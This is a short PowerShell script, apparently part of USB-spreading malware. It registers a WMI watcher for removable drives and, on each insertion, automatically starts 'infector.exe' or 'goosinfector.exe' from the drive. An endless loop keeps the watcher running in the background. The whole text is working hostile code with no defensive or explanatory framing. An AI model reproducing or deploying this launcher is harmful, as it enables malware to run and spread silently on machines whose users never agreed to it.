

$null = Register-WmiEvent -Query "SELECT * FROM __InstanceCreationEvent WITHIN 2 WHERE TargetInstance ISA 'Win32_Volume' AND TargetInstance.DriveType = 2" -SourceIdentifier "USBInsertWatcher" -Action {
    $drive = $Event.SourceEventArgs.NewEvent.TargetInstance.DriveLetter
    if (Test-Path "$drive\infector.exe") {
        Start-Process "$drive\infector.exe"
    } elseif (Test-Path "$drive\build\goosinfector.exe") {
        Start-Process "$drive\build\goosinfector.exe"
    }
}

while ($true) {
    Start-Sleep -Milliseconds 1
}